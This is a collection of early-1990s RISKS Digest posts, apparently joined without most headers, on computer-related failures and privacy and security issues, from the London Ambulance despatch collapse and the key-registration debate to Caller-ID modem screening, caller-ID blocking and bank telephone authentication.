Today's `Independent on Sunday' (1st November, 1992) has further details
relating to the failure of the automatic despatch system introduced by the
London Ambulance Service last Monday.  While it is difficult to get hard detail
from a newspaper article, some of the points made include:

    - the despatch system could not distinguish between duplicate
      calls relating to the same incident.  In some cases several
      ambulances turned up to respond to the same incident.

    - logged calls were lost.  One particular case is related in
      detail, in which a disabled woman was trapped in her chair
      by the body of her collapsed husband.  She called the LAS
      every 30 minutes, on each subsequent call being told that
      there was no trace of the earlier call.  An ambulance 
      eventually arrived 2.75 hours  after the initial call, by 
      which time the husband had died.  

The article also relates details of the pathetic attempt by the LAS and
government to `manage' the publicity over the failure.  When the LAS management
eventually pulled the system out, on Tuesday, they initially tried to ``deflect
blame onto the staff''.  On wednesday, a government minister announced that the
`computer had broken down'.

As you know, there has been a huge response to the "key registration" idea. I
posted a synopsis of the Dorothy Denning proposal in sci.crypt as "A Trial
Balloon to Ban Encryption?" So far, over 200 responses to this "risk."  The
following piece was posted a few days ago (Friday) to sci.crypt.

Subject: Alarmism and Prof. Denning
Organization: Netcom - Online Communication Services  (408 241-9760 guest) 

Several people have complained, either in this group or in e-mail to me, that
some of my recent comments have been alarmist and detract from what they
consider to be my otherwise well-taken points. Fair enough.

In one posting I said "Be afraid. Be _very_ afraid." I assumed most folks would
recognize this as the tag line from the movie "The Fly." I thought it
euphonius, so I borrowed it. In any case, having some fear of what governments
may do to us seems to me to be a healthy thing.

I took great care to be as reasonable and as calm as possible a few days ago
when I posted the first message in this thread ("A Trial Balloon to Ban
Encryption?"). Clearly the key registration idea is controversial.

Now let me be even _more_ reasonable. I think Professor Denning has done us a
great service, as it has gotten some healthy debate going about these very
important issues. The more than 130 messages, most of them making excellent
points, in this group (and a few others, peripherally) indicate the intense
interest and scrutiny this subject has attracted.

Dorothy Denning has long been involved in crypto (she wrote the book, so to
speak) and more recently in hacker matters, as detailed in Bruce Sterling's new
book "The Hacker Crackdown." To assume she is somehow pushing this idea, in the
legislative sense, seems unfounded.  It seems to me that she thought about some
of the serious implications of widespread crypto use, developed some ideas (as
Ron Rivest did last summer in an article in "IEEE Spectrum"), and talked about
them at the recent Computer Security Conference. Now we may think her
particular idea is wrong, for political and technological reasons, but we
should not villify her for floating the idea.

I used the term "trial balloon" in perhaps a way I should not have. It may have
suggested to some that Prof. Denning, who recently relocated to the Washington,
D.C. area, is part of a cabal of crypto advisors who are plotting the next
stage of our enslavement. (A smiley) So far as I know--and I hope we'll find
out soon enough--there is no proposed legislation along the lines Prof. Denning
suggested. I doubt she was acting as an agent for the Feds in floating this
idea. Just academic freedom at work.

Furthermore, I favor the open discussion of ideas. I am not one to fear
discussing some new idea, or technology, or whatever, for fear it will "give
Them ideas" or catalyze a crackdown. In an open society like ours, debate is
healthy.

I am happy this issue, which is one of several important crypto policy issues
that have been simmering for a long time, has come to prominence. I look
forward to seeing the debate here.

(The only thing that worries me is that folks may get so clever,
cryptographically speaking, that they patch the flaws in the key registration
proposal and thus make it more likely to become law.  Let's not lose cite of
the fundamental issues surrounding liberty, surveillance, and privacy. But
since nearly everyone who has posted so far seems strongly committed to civil
liberties, these worries are minimal.)

On with the debate.

Keywords: Blockbuster video data privacy dossier database
Organization: Netcom - Online Communication Services  (408 241-9760 guest) 

Blockbuster Entertainment Corp. announced plans to used its database of 30
million Blockbuster video club members as part of its marketing push into the
music business.  Blockbuster is acquiring the 7th largest and 12th largest
record chains from Shamrock Holdings, Inc, which will make Blockbuster the 7th
largest record retailer by the end of November.

Blockbuster sees many opportunities to cross-market home videos and music.  Mr.
Steven R. Berrard, vice-chairman of Blockbuster, said that Blockbuster could
offer free video rentals to customers who buy music from Blockbuster record
stores.  This works both ways; he was quoted as saying "If you rent a Disney
animated film for your children, I know there might be music that appeals to
them.  This is a significant plus."  He, and Mr. Joseph R. Baczso, speaking to
reporters and financial analysts in New York, said one of the company's
strengths in music retailing will be its base of 30 million Blockbuster video
club members and the data it has on those customers.

Whether or not such use of personal data would be a violation of the Video
Rental Privacy Act remains to be seen.

It just *so* happened that I was in France last week (on something completely
unrelated: an ISO meeting). I dropped into the office of a certain lawyer in
Paris on my way out and back.

On the way out, he gave me a photocopy of an article in "Le Canard Echaine", 
about Michel Asseline's book about the Habsheim crash. On the way back, he 
gave me two photocopies of articles in "L'Alsace" (regional newspaper serving 
Habsheim and surroundings), and "Le Monde", which had appeared that very day 
(Friday 30th Oct.) or the day before. 

The last two articles are detailed accounts of the "descente intempestive" 
which has been reported recently. If what the articles say is true, then it 
looks as though all bets are off regarding Bangalore, Strasbourg, AND the 
A300 and A310 crashes in Kathmandu. 

To summarise: When "rate of descent" mode is selected, (as opposed to "flight 
path angle"), a fault in the FMGS software occasionally causes the aircraft to 
descend at **2 or 3 times** the rate selected by the pilots. 

They don't even NEED to confuse "rate of descent" and "flight path angle"!!! 

This was reported by several crews who were able to recover the situation 
because they weren't flying over mountains at the time. 

The FMGS software (I *think*) is NOT regarded as SAFETY-CRITICAL!!!! 

If this is so, then it is NOT certified to RTCA/DO-178A level 1. 

The SAME FMGS is in use on A300, A310, and A320 (at least, *basically* the 
same)!! 

The French pilots' unions are up in arms about it, and in France generally, 
all hell seems to be breaking loose. 

Typically, in the UK press, the silence is deafening. (Presumably none of 
their French correspondents can speak French! :-) 

The other thing that my French lawyer colleague gave me was a signed copy of 
Michel Asseline's book about Habsheim: "Le Pilote - Est-il Coupable?" 
(You've guessed! He's Asseline's solicitor! :-) 

Since I read French even more agonisingly slowly than I read English, you'll 
have to wait a while for my detailed review. In the meantime, I will try to 
find time in the next few days to translate the three newspaper articles. 

If anyone sees anything in the media (French, UK, US and all points between),
let us all know.

Pete 

PS: If anyone knows of a publisher willing to handle the forthcoming English 
translation of Asseline's book, let me know about that, too.

&gt; Apparently, so I am told, CFCs have been replaced in these aerosols by
&gt; flammable propellants. 

Come back CFCs, all is forgiven! 

Actually, I suspect that most of the CFCs that hit the ozone layer come from 
decommissioned refrigerators or industrial waste, and not from you or I 
spraying our hair or computer screens. (Prince Charles is reported to have 
banned the use of CFC aerosols in the Palace. "Every little helps!", as the 
wren said when she pee'd in the ocean! :-) 

Why not go for the "Pump and Spray" approach adopted by a certain manufacturer 
of hair laquer? The lid of the can activates a pump. You push it up and down a 
few times to pressurise the can, and then spray out the contents with a 
propellant no more polluting (or inflammable) than compressed air.

&gt; In a three-month study of the Metro Toronto area earlier this summer, Bell
&gt; found that 80 percent of all cellular telephone traffic is monitored by third
&gt; parties.  Even more eye-opening is the fact that 60 percent of monitored calls
&gt; are taped for closer scrutiny and culling of marketable information.

I would very much like know how Bell Canada obtained these figures, given that
the monitoring of cellular telephone calls from the privacy of one's home is
essentially undetectable.

&gt; After discussing privacy laws, legalities, and realities, Flinn notes that at
&gt; Scanners Unlimited in San Carlos, CA, "about a quarter of the customers are
&gt; interested in telephone eavesdropping."

This problem will soon be stopped cold, as Congress recently passed a law to
outlaw the manufacture of scanners capable of receiving cellular telephone
calls. A truly inspired solution to the problem, comparable to the "B-Ark"
people in "The Hitchhiker's Guide to the Galaxy" burning down the forests to
solve the inflation problem caused by making leaves legal tender.

Erling Kristiansen writes (concerning cash dispenser fraud): 

&gt;  If you do not take your money within a given time, the machine will swallow 
&gt; it back, and undo the transaction on your account. 

Not in my experience. (See RISKS about a year ago.) I simply forgot to take the
money, and the machine swallowed it. To get the amount credited to my account,
I had to 'phone the bank personally, and the amount was only repaid after the
till had been (manually) balanced, and the excess cash in stock verified.

I realize that this may be a bit out of the ordinary for a RISKS posting but
since Rob Slade raised the issue in RISKS yesterday, I have gotten quite a few
questions.

First, it is my belief that much of the RISKS of dial-up access points is
increased by the ease of discovering such points. War Dialer and Exchange
Hacker programs are plentiful and have contributed to a number of notorious
cases recently (the MOD is said to have used this method of discovering such
lines).

The problem is that with all current systems that I am aware of, it is first
necessary for the modem to answer the telephone before any authentication can
take place. By doing so, the line may be positively identified as having a
modem even if call-back or other rigorous identification means are in use.
Once such line have been identified, serious penetration attempts can take
place.

When announced, it was realized that Caller-ID provided an answer to this 
dilemma that was much better than the "ATS0=7" which I previously advised.
(This command instructs a modem responding to the "AT" command set not to
answer the phone until the seventh ring - typically about 40 seconds after
connection starts. Since most War Diallers allocate only 30 seconds to each
number, this is an effective, if annoying, answer).

Caller-ID places a 1200 baud digital signal on the telephone line between
the first and second ring signal. The important factor is that the phone
does not have to be answered to received this information. Some modems
are able to pick up this signal and present it to the host computer.

What I did last weekend was to create a PROCOMM PLUS script file using their
ASPECT language to do the following:

1) When the telephone rings the calling number is captured.

2) The number is recorded into a "LOG" file and then a scan of a database
   of "approved" numbers (flat ASCII) is done.

3a)If the number is found in the "approved" file, PROCOMM is instructed to
   enter its "HOST" mode - an effective single line BBS emulation that
   supports uploads/downloads/mail/and "chat" and the phone is answered.

or

3b)If the number is not found, the line is not answered

4) After the caller hangs up, the system resets.

Given this, even if the "bad guys" know the number, they will still have to
find a way to induce the modem to answer the line. Certainly if this were in
widespread use, much of the plot of "Sneakers" would have had to be re-written. 

Yes, I know that there are problems, particularly with "roving" people. If
however 80-90% of all access could be handled in this manner (e.g. for
telecommuters), the balance could use extraordinary means.

Right now the capability is limited to a PC running PROCOMM Plus 2.01
and equipped with a Supra Corp. SupraFAXmodem having the Caller-ID
ROM upgrade. I haven't tried any others.

Why did I choose this combination ? - because I had them (both were privately 
purchased) and they would do what was necessary - this is all a hobby 
to me. In theory any Caller-ID unit with an RS-232 output could be used
as could any scripting BBS software. What was desired was a "proof-of-
principle" not a commercial product.

The PRIVACY concern is easily handled: you can block your number from
Caller-ID (star-6-7 in most places) but I reserve the right not to have
my computer answer the phone if you do.

IMHO this capability is still in its infancy but is important and easily
implemented, we are just seeing the tip of the iceberg now.

Right now the biggest drawback is the limited availability of Caller-ID
though IMHO again it will be nationwide in two years (law enforcement
agencies already have a wider coverage so the holdup is political, not
technical).

RISKS ? To me the most important is the question "Could an individual
use star-6-7 to block the telco's ID and send their own 'approved'
1200 baud stream ?" The consensus so far is "NO" and I have some friends
at GTE experimenting.

In any event, the script is FreeWare for anyone who might be interested,
just be aware that I do not have any distribution means (might be able to 
send as E-Mail) and negative free time.

The importantance of this is that it is no longer theory, it is now fact, CHEAP
fact.

ps: Just to avoid the inevitable, Supra Corp. can be reached in Oregon
    at (800)727-8647 (do not think Caller-ID is available outside the US 
    yet). I bought mine from a mail-order house for about 3/4 list price.

For further commentary on this issue, see the recent Forbes magazine article by
Mitch Kapor.  It raises the issues of how the ECPA Act and similar California
privacy legislation might apply to this case.  It will probably make a number
of lawyers rich and drag on for years, but there are some very complex legal
issues involved.  The issue involves MCI's responsibility as an e-mail provider
under ECPA and whether Borland was or was not authorized to have access to
Wang's mail.  I doubt that all the relevant facts are yet public.

There are two topics in <A HREF="/Risks/13.87.html">RISKS-13.87</A> that are actually related.  Someone asked
about software that could have been used to get the deleted files from the
Brazilian president's disks.  There was also a mention of the Symantec/Borland
suit over theft of trade secrets.  The Wall Street Journal had the most
complete article about the latter (I don't have the date handy) and mentioned
that Borland used a copy of a Symantec product, Norton Utilities, to recover
erased files that are being used as evidence in the case against Symantec.
Apparently Norton Utilities is widely used by law enforcement agencies for
gathering evidence in cases involving PCs.  The product also includes a utility
for ensuring that deleted data cannot be recovered, but many people seem to
think that if they "delete" a file and it seems to be gone, then that's what
really happened to it.  There's always a risk when a user's model of what the
computer is doing behind the scenes is a simplified one which is adequate for
doing their work, but not for predicting the outcome of unusual circumstances.

David Honig remarks on his discovery that users of SunOS can allocate shared
memory resources and fail to delete them properly, thus effectively rendering
them unavailable to later programs, which fail.  Only a reboot will resolve the
situation.

A couple of remarks:

	a)  All the Unix System V IPC objects have this property.  Allocating
		and failing to free shared memory segments, semaphores, or
		message queues, all of which exist in limited numbers and
		cannot be replenished, can also cause later numbers to fail.

		Mr. Honig remarks that there are typically 100 memory
		segments.  There are typically considerably fewer semaphores
		or message queues.

	b)  This is not a SunOS problem; it's inherent in System V, which
		defines a set of IPC facilities which allow objects to persist
		even though no one is using them.  Programs probably exist
		which rely on this, so I doubt it can be changed.

	c)  It IS possible to recover from this without rebooting, since root
		can attach to the "lost" objects and delete them.  Of course,
		you have to find them first.  At least on Ultrix, and probably
		on most other systems, there is a program (ipcstat, I think)
		which displays a list of all IPC objects in the system.  It
		would remain up to a human being to decide which ones can
		be deleted safely, however.

	d)  Given (c), the situation is, in a way, analogous to running out
		of disk space because the disk is full of old junk.  This
		similarity, however, is tenuous, for several reasons:  Disks
		are much larger than the sets of IPC resources available;
		the names of files being created are generally known, except
		for temporary files - which as a matter of policy are treated
		as expendable after a short time, and automatically cleaned
		up; and people regularly see directory lists, but they rarely
		if ever have reason to run ipcstat.

First, I should hate to think that my right to safety from illegal search and
seizure and/or illegal eavesdropping on my telephone conversations rested on
the good will and integrity of a phone company!

Second, it's difficult to envision a non-governmental agency, created by the
government but not really government.  The Post Office purports to be a
non-governmental agency but isn't.  It's employees still look and act like US
Civil Servants, and the P.O. can easily conduct a "mail cover" for a
governmental agency without a court order.

You must remember that court orders, search warrants, and the like are useful
only when the information or evidence gathered under their aegis is to be used
in court against a suspect.  If information is being gathered for political
purposes, to blackmail someone, or to subvert the law (Watergate, Iran-Contra,
the Italian bank, etc), the information will never see a public forum.  Thus,
the constraints of court orders are obviated.

The FBI needs to fund its own R&amp;D out of its budgetary resources, just as the
rest of the government at all levels must do.  There is talent that can "red
team" modern telecommunications and find trapdoors when necessary.

You must never forget that the gravest threat to our freedom is, and always has
been, government itself.

In the exchange over Dr. Denning's proposed key registration agency, I have
learned that there are civilized countries out there (eg., Finland) where it is
illegal for the government to do a wiretap.  Even getting phone records in
Finland (for traffic analysis) apparently results in the target's being told.

Sadly, we're not that civilized, it seems.

I can imagine some large company (one of the Baby Bells, perhaps) making a line
of scrambled, digital phones -- perhaps cellular -- perhaps just wireless, but
with digitization and end-to-end encryption done in the handset.  I could see
this line of phones using RSA (1000 bit) to pass triple-DES keys around (DES
with 3x56 bit keys and 3x64 bits of random IV for CBC mode).

I can imagine that large company offering to register keys for the FBI --
just to keep from being hassled by the Gov't.

Were that to happen, I might even buy such a phone -- knowing that it's
insecure but also knowing that my neighbor won't be listening in on her
wireless phone.

However, it's important that the agency which releases keys not release the RSA
keys (in this case) but rather the session key (360 bits of DES key and IV) of
a particular conversation.  Releasing the RSA key makes the phone in question
insecure for all time, past and future.

(No, I don't advocate key registry -- but if it looks like we end up having it,
let's have it limited.  Meanwhile, it's perfectly reasonable to have an audit
trail of all such taps made available to major news organizations immediately
and eventually to the person targetted -- so that any Nixon-like abuses would
get caught and prevented.)

&gt;                         August 26, 1993
&gt;                 2:30 p.m. Pacific Daylight Time
&gt;
&gt;     Communications with the Mars Observer spacecraft have not yet
&gt;been restored, one and a half days past its planned insertion into
&gt;orbit around Mars.
&gt;
&gt;     Mission controllers at JPL continued through the night and
&gt;morning with efforts to re-establish the necessary radio link with
&gt;the spacecraft by cycling the various elements of the
&gt;communications system.
&gt;
&gt;     At 2:37 p.m. Pacific Daylight Time today, the continued
&gt;execution of the command loss timer subroutine will try to position
&gt;the spacecraft for optimum pointing and will switch antennas to try
&gt;to restore communications.
&gt;
&gt;     Project officials still do not believe that the propulsion
&gt;tanks leaked or exploded at the time of their pressurization. The
&gt;pressure in the tanks at launch was 285 pounds per square inch
&gt;absolute (psia).  As propellants were used during the three
&gt;trajectory correction maneuvers, the pressure was reduced to about
&gt;167 psia. Pressurizing the tanks would have raised the pressure to
&gt;264 psia. Any greater pressure would require a failure of both of
&gt;the in-series pressure regulators. The burst pressure specification
&gt;of the tanks is 465 psia and actual test data ruptured tanks at 678
&gt;psia.  Flow restrictions limit the rate at which the pressure can
&gt;increase.  Analysis indicates that the probability that the
&gt;pressure in the tanks would increase to the burst level within the
&gt;9 minutes that the radio transmitter was off is less than 0.1%. 
&gt;
&gt;     Project officials are systematically evaluating the most
&gt;probable sources of the cause of the spacecraft's failure to
&gt;communicate.
&gt;
&gt;     One such source which has been receiving considerable
&gt;attention is the potential failure of the spacecraft's central
&gt;clock, whose official name is the "redundant crystal oscillator,"
&gt;or RXO for short.  Proper operation of this device is required for
&gt;operation of the spacecraft's central computers, which sequence the
&gt;events on the spacecraft.  
&gt;
&gt;     The first hypothesis for the lack of communications pointed 
&gt;to the failure of the central computer to turn the transmitter back
&gt;on.  Failure of the central clock would prevent the central
&gt;computer from doing its job.  After sending commands to turn on the
&gt;transmitter, switching to the backup clock was the next action
&gt;taken by mission controllers.
&gt;
&gt;     The central clock has been the focus of investigation because
&gt;it contains transistors which have failed in other spacecraft
&gt;applications using this type of clock.
&gt;
&gt;     The launch of the NOAA-I spacecraft was delayed at the end of
&gt;June 1993 when it was discovered that its RXO had failed.  A
&gt;subsequent investigation revealed that the RXO failure was caused
&gt;by the failure of a 2N3421 transistor.  Two of these transistors
&gt;are used in each of the redundant halves of the RXO.  Transistors
&gt;from the same manufacturing lot as those in the NOAA-I RXO are
&gt;installed in the Mars Observer RXO, making the reliability of Mars
&gt;Observer's RXO suspect.
&gt;
&gt;     The transistors fail when a weld between a gold-plated post
&gt;and an aluminum wire breaks.
&gt;
&gt;     This potential problem was discovered when Mars Observer was
&gt;only 55 days away from Mars after the spacecraft had been in flight
&gt;for over nine months.  Because of the way that these transistors
&gt;are used in the RXO, Mars Observer would be susceptible to losing
&gt;its central clock function if one particular transistor in each
&gt;half of the RXO failed.
&gt;
&gt;     There is no alternative source of the central clock function
&gt;in Mars Observer, and should the loss of this function occur, it
&gt;would be a non-recoverable situation.
&gt;
&gt;     The RXO, on its primary side, was working perfectly
&gt;immediately before the pressurization activity.  The last time the
&gt;backup side of the RXO was tested was in a launch GO/NO-GO test on
&gt;launch day, when it was also found to be working perfectly.
&gt;
&gt;     Project officials were not, at first, concerned about the
&gt;NOAA-I RXO failure because it would take a failure of two of these 
&gt;transistors to cause the loss of the central clock function.  The
&gt;spacecraft is not designed to automatically protect itself against
&gt;more than a single failure in any piece of hardware.
&gt;
&gt;     The restoring of the spacecraft's transmitter and the
&gt;spacecraft's failure to act on ground commands could be tied to the
&gt;loss of the central clock function.  Project officials now surmise
&gt;that one explanation for the loss of communications could result
&gt;from the failure of the crucial transistor in each half of the RXO,
&gt;or its failure to autonomously switch to the backup side.  Then
&gt;there would be no central timing function.  This failure could have
&gt;been induced by the shock of the pressurant valves operating during
&gt;the propulsion tank pressurization event on Aug. 21, after which
&gt;communications were not restored.

As far as I can tell, the real problem was control-surface rate limiting.
Cf. the YF-22 crash and the Space Shuttle ALT-5 multi-axis PIO.

I've flown a rate-limited configuration in a variable-stability Learjet
and it looked a lot the same, just before the safety trips gave the plane
back to the safety pilot.

I've read the articles in AvLeak and Flight International and looked at the
video a couple of times.  My branch chief and some USAF handling qualities
guys are going to Sweden the end of next week, too.  Not controls engineers,
handling qualities engineers.

The Feedback section of the latest New Scientist relates the following
Computer Weekly story about an unfortunate programmer at an unnamed
bank.  Apparently, the bank wanted to target its wealthiest customers
with a mailshot promoting various new services and the programmer in
question wrote a program to select the 2000 wealthiest customers from
the bank's records and to generate an appropriate letter for each.  In
the process of testing the program, he made use of a fictitious customer
named Rich Bastard.

Unfortunately, as you may already have guessed, something went amiss and
every single one of the bank's 2000 prize customers received a letter
which began "Dear Rich Bastard, ..."

The risks involved?  Well, for one thing, the hapless programmer lost
his job over the incident.  More generally, I suppose it's just another
example of the way in which the complex interactions amongst program
development, testing, and maintenance can produce unpredicted and
undesirable consequences.  The latter analysis is, of course, rather
generous to the programmer.

Brinton Cooper quotes out of context, incidentally from a book whose 
subtitle reads "the Hardware/Software Interface," a line he probably
intends as a subject for meditation.  Saying "...minimizing the logic is
both complex and error-prone and, thus, is better left to a program,"
has ironic overtones in this forum.  But I'd bet a cup of coffee that,
taken in context, it's sound engineering advice. 

The workstations and PCs we use to read RISKS all contain semi-custom
and sometimes programmable logic chips.  Reduction of the Boolean logic
equations, that is, minimization of AND-OR logic terms, directly
influences the size of the chips and thus their cost.  Reducing large
Boolean equations by hand _is_ complex and error-prone, just like
programming large systems in assembly language would be.  Thus it's a
safe bet that the book's authors are advocating the use of design
automation tools for real-world digital logic design. 

Chip designers would argue, justifiably, that today's automated tools 
decrease both design time and design risk.  The RISK Cooper illustrates 
is in mistaking a practical viewpoint for complacency.

	Until recently, I had the good fortune of living in a telephone
exchange without this problem, but I had heard about it from others and
just couldn't believe it was so.

	Why do I have to dial 1 before some numbers and not before others?
The computer at the phone company politely tells me to dial 1 first, or
to not dial 1 first depending on where the call is made to, but this is
little comfort for my autodialer making a series of several thousand calls
to send out FAXes.  If they can tell me to add 1 or not, why can't they just
add it or not for me?

	The Cisco router problem is particularly important because so many
people use this router to secure their network into isolated partitions.

    [*** Some correspondence from Cisco doubts that this vulnerability 
    exists, and indicates that there is certainly NO INTENTIONAL TRAPDOOR.  
    An official response follows.  PGN ***]

	The risks of not receiving risks and risks not finding out about it
may be more severe than the risks of sending out risks for all to see.  My
computer mail address was recently cut off, and apparently, every piece of
mail sent to me was not forwarded, and not reported as undelivered!  I must
have missed a lot of risks that I am now vulnerable to and don't know about!
Then there is the question of who got those mailings I missed.  Is there a
forger out there claiming to be me?  Or am I the forger claiming to be him?
The finger command has a few minor problems worthy of note.  One is that it
tells you if my mail has been removed from the mail queue, but not if I really
read it.  Another is pointed out if you finger me at this mailing address.
Something about the plan containing false and misleading information.

There are no known bugs in any software providing access-control-list
functionality in any current cisco software.  There has only been one very
obscure bug that could cause a security problem in the history of our product,
and we immediately fixed this problem, published an immediate workaround, and
informed CERT of this problem.  We have never, and will never implement any
sort of trapdoor or backdoor functionality which would allow bypassing of
ordinary security systems.

In <A HREF="/Risks/14.87.html">RISKS-14.87</A>, PGN repeats the oft cited claim that the sendmail debug option
opens a security hole.  Although it is true that earlier versions of sendmail
did allow debugging to enable mail to arbitrary addresses (including
programs), this hole should be well plugged by now.

Conversely, encouraging people to disable all debugging options may itself
cause problems.  Many of the debug flags are exteremely useful when installing
and debugging config files.  Scaring people into turning off all debugging is
not productive.

By the way, despite many claims to the contrary, the security hole used by RTM
was not an intentional back door -- it was a bug, plain and simple, as I've
published in the past (for example, see the C Advisor column in UNIX Review 7,
1 (January 1989)).

PGN's reply on this subject ended with
 
&gt; Does anyone care?

I've noticed that most people tend to focus their energies on whatever "fire"
happens to be blazing in front of them.  I often go to a sysadmin with a clear
description of some hole in security (or procedures, or ...), only to be told
"I'll get to it when I can" (which means "never").  The only time that the
problem gets their attention is when an actual breach (or failure) occurs, and
peoples' work is lost.  I can sometimes feel like taking Robert Morris'
approach and breaking something just so that it will get the attention it
deserves.

The preceding symptom is certainly not limited to computer systems.  Here in
Massachusetts, there has been a rash of "child fallen out the upper-story
window" incidents this summer.  The cause of the problem is children playing
in an upper-story room with an open window and only the screen for protection.
Now that 3 children have died and 13 more spent time in hospitals, local
organizations are distributing safety bars for windows.

I fear that the answer to Peter's question is "No, no-one cares, until someone
gets hurt."

In New York, NY Telephone has managed to really screw up *67 caller ID
blocking -- a phone line defaults to "send caller number" mode, and dialing
*67 prevents the calling number from being displayed on the other side.  If
you tell the phone company that you want your line to default to NOT send the
calling number, they give you "all call restrict" and you are supposed to dial
*67 if you WANT your number to be displayed on the other side.

Naturally, there's no way to tell which way a phone line defaults to -- except
for the reminder stickers that NY Tel sends you to stick on your phone.  So if
you're using an unfamiliar phone, just what *67 will do is undeterminate.  My
suspicion is that NY Tel did this to discourage people from trying to suppress
Caller ID, since they want the service to be as universal as possible.  My
suspicions are furthered by the fact that when I installed a new line, they
didn't ask me whether I wanted to default to outgoing caller ID blocking or
not...

Perhaps the most annoying feature of the *67 call blocking services is that
they do *NOT* block your phone number for companies that purchase commercial
"caller ID" services (Automatic Number Identification) from their common
carrier.  For example, when you call a catalog retailer's 800 number using the
*67 number, the retailer is still able to capture your phone number and add it
to their data base.  The *67 service only blocks your number for people who
have the residential Caller ID service.  The RBOCs that offer *67 call
blocking services do not seem to mention this distinction.  As a result, many
callers are tricked into thinking that their privacy is protected through *67
when, in many cases, it is not.

Before we go overboard with this abstraction replacing reality idea, consider
that books which we have been reading for much longer than we have had
computers or television are also abstractions. Audio Visual media may be a
great improvement on text but they cannot become reality.  Otherwise we would
not go to ball games, and foreign countries, join demonstrations and meet
people for lunch. As in the case of any successful abstraction people's
appetite for reality is increased not diminished by the taste they get on the
television or computer screen.  This actually goes back to the old debate in
artificial intelligence - "Can a computer become sentient?" The true question
there was not whether a computer can or not but "What is sentience?" In the
same way before we ask whether virtual reality can replace reality, we must
first ask what is it that we call reality.

    Citibank gives out an ATM PIN with it's cards. Why in the world they
    don't use that as telephone authentication..., I have no idea.

I do.

My bank has an explicit policy that bank employees are not to be told
PINs--PINs are only to be keyed into machines (which presumably encrypt
them before transmission).  If a dishonest person who found your wallet
could do damage with your authenticator, imagine the damage that could be
done by a dishonest "inside person."

Tom Swift asks (in <A HREF="/Risks/14.88.html">RISKS-14.88</A>) about the common practice of asking for and
using a separate password (Mother's maiden name) for bank accounts rather than
using the already secret PIN.  

I think Banks have the right idea here, though they often implement it poorly.
There are several good reasons for not using the PIN as a telephone
verification password.

	1.  Most banks don't give PIN access to phone clerks since the PIN
	    poses the most direct security risk (they must allow account 
	    numbers to be identified and PIN+acct+card writer == ca$h).

	2.  Many smaller banks and credit unions can't change the PIN 
	    without reissuing the card or account.  While their PIN system
	    may be crippled, it is certainly wise not to risk compromising
	    it over the phone.

	3.  A pin is too easy to overhear over the phone.

	4.  What happens when you lose (forget) your PIN?  You need some
	    way of calling to have a new one assigned.

Mother's maiden name isn't ideal, but almost every bank is open about the
fact that they'll take any pronounceable password.  Accordingly, you can
make up a good mother's maiden name and have extra security.

American Express handles things somewhat differently.  Usually they 
ask a simple question like "is anyone else on the card with you?" or "how many
additional cardholders are on the account?" but they tend to ask more detailed
questions when you are talking major action (as opposed to simple queries).  
Among the more interesting questions are ones that ask you to describe recent
transactions (once I was asked for the last meal I charged on the card) which,
seem like good general authentication questions that would only be troublesome
if the card were already stolen and used successfully.

                           CALL FOR PAPERS
                IEEE COMPUTER SECURITY FOUNDATIONS WORKSHOP VII
                          June 14-16, 1994
                     Franconia, New Hampshire
                Sponsored by the IEEE Computer Society

The purpose of this workshop is to bring together researchers in computer
science to examine foundational issues in computer security.  We are
interested both in papers that describe new results in the theories of
computer security and in papers, panels, and working group exercises that
explore open questions and raise fundamental concerns about current theories
of security.  Possible topics include, but are not limited to:

  access control                  distributed systems security
  authentication                  formal methods for security
  covert channels                 information flow
  data and system integrity       secure protocols
  database security               security models

We are also interested in examining the interactions and trade-offs between
computer security requirements and other system requirements such as
availability, dependability, and real-time, and in exploring foundational
security issues in emerging areas such as ubiquitous computing, multimedia,
and computer supported cooperative work.  The proceedings are published by the
IEEE Computer Society and will be available at the workshop.  Selected papers
will be invited for publication in the Journal of Computer Security.

Instructions for Participants: Workshop attendance will be by invitation only
and limited to thirty-five participants.  Prospective participants should send
five copies of a paper (limit 7500 words), proposal for panel discussion or
working group exercise to Li Gong, Program Chair, at the address below.
Please provide E-mail addresses and telephone numbers (voice and fax) for all
authors and clearly identify the contact author.

IMPORTANT DATES: Author's submission:        February 10, 1994
                 Notification of acceptance: March 11, 1994

ROBOT SENT TO DISARM BOMB GOES WILD IN SAN FRANCISCO

San Francisco, Aug 27 (AP) -- A hazardous-duty robot malfunctioned Wednesday
night and spun out of control in an attempt to defuse an explosive situation.
"It was just spinning around, just going wild," said Edward Ellestad, a member
of the Police Department's bomb squad.  "People were yelling, `Shut it off!'
So we pulled the plug."  The police robot, nicknamed "Snoopy", went out of
control as officers tried to get it to grasp a pipe bomb found at the C&amp;B Cafe
during a raid.  "It could have been a lot worse if had picked up the device
when it was doing 360's and banging off the walls," Officer Ellestad said.

   (Hilliard, Florida) -- The Federal Aviation Administration is still at a
loss to explain a computer glitch that knocked out a regional air traffic
control center in Hilliard, Florida.  An FAA spokeswoman says the trouble
yesterday caused delays of up to 90 minutes for flights in a large area of the
south. No planes or passengers were in danger.  In one case, access to a
cellular phone may have been key. The head of the local National Air Traffic
Controllers Association says one controller used a car phone to contact the
Air Force. He wanted to stop a live-fire exercise, because there was no way to
control other planes entering the area.  The FAA says it does not know what
caused the computer problems.

[From *AOPA Pilot*, September 1993, page 33]

   For a 12-hour period between July 7 and 8, the computers shut down at the
Salt Lake City and Atlanta aviation weather processors.  As a result, weather
information could not be transmitted to the entire automated FSS [Flight
Service Station] (AFSS) network, and nearly all AFSSs lost their ability to
file flight plons.  The system later returned to normal.  Apparently, the
computer crash was caused by a time-activated virus in the weather processing
software.  Both processors shut down at the same time.
   A separate system--known as Labs--that uses the old, teletype method of
transmitting weather data was not affected by the outage. This system, based
in Kansas City, continued to provide weather and flight-plan capability to
DUAT contractors, private weather vendors, FSSs and those AFSSs with teletype
equipment.  Labs is not connected in any way to the Salt Lake City and Atlanta
aviation processors.
   AOPA [Aircraft Owners and Pilots Association] has recommended that Labs 
equipment be retained, even though it's a dated system.  In addition to its 
merits as a provider to DUAT and private vendors, the computer crash proved 
that Labs can be a valuable backup mechanism to the main weather processors.

*The New York Times*, August 27, 1993, p. B9, reports on a service in
Philadelphia that lets doctors find out whether a patient has filed any
malpractice suits.  The article discusses the obvious risks and makes it
sounds like most doctors are unlikely to be interested.  The service also
calls to mind the reportedly widespread practice of blacklisting job-seekers
who have filed workers' compensation claims.

The *Wall Street Journal*, August 27, 1993, pp. A1, A8, reports on the
computer industry's possible vulnerability to disruptions due to the
concentration of chemicals firms.  In some cases, chemicals used in
chip-making and packaging are only produced by a couple of plants, at least
one of which is on an earthquake fault in Japan.  This is perhaps an instance
of "hyperefficiency", the claimed tendency of market economies to expose
themselves to excessive disruption from rare but serious events in cases in
which companies find it difficult to invest in long-term disaster preparation
